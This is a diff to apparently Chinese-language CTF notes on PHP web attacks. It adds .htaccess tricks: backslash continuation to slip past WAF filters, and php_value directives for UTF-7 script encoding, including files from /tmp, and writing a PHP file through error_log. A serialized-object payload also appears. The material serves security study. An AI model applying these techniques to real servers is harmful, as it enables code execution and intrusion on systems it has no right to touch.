@@ -104,7 +104,7 @@ O:4:"Name":3:{s:14:"\0Name\0username";s:5:"admin";s:14:"\0Name\0password";i:100;
 - 正确解析绕过
   
   ``.htaccess``中出现的无法正常解析的条目时无法生效
-  
+  - ``\``换行绕过脏字符或绕WAF
   - 利用XMP图片解析头(``#``刚好是注释符)
     
     ```
@@ -128,6 +128,7 @@ O:4:"Name":3:{s:14:"\0Name\0username";s:5:"admin";s:14:"\0Name\0password";i:100;
     SetHandler application/x-httpd-php
     </FilesMatch>
     ```
+- 
 
 - **利用php_value注入php配置**
 
@@ -137,7 +138,7 @@ O:4:"Name":3:{s:14:"\0Name\0username";s:5:"admin";s:14:"\0Name\0password";i:100;
         php_value auto_prepend_file "<phpFileDir>"
         php_value auto_append_file "<phpFileDir>"
         ```
-        
+
     - 利用prce参数绕过preg_match
         
         ```
@@ -148,5 +149,21 @@ O:4:"Name":3:{s:14:"\0Name\0username";s:5:"admin";s:14:"\0Name\0password";i:100;
         任意匹配均返回``FALSE``
         
         > https://www.php.net/manual/zh/pcre.configuration.php
-    
-    
+  
+    - 利用UTF-7编码绕过日志html编码
+       
+       ```
+        php_value zend.multibyte 1
+        php_value zend.script_encoding "UTF-7"
+       ```
+    - 利用inclue_path包含恶意文件
+
+      ```
+        php_value include_path "/tmp"
+      ``` 
+    - 利用``error log``写本地文件 (html编码)
+
+        ```
+        php_value error_log /tmp/fl3g.php
+        php_value error_reporting 32767
+        ``` 
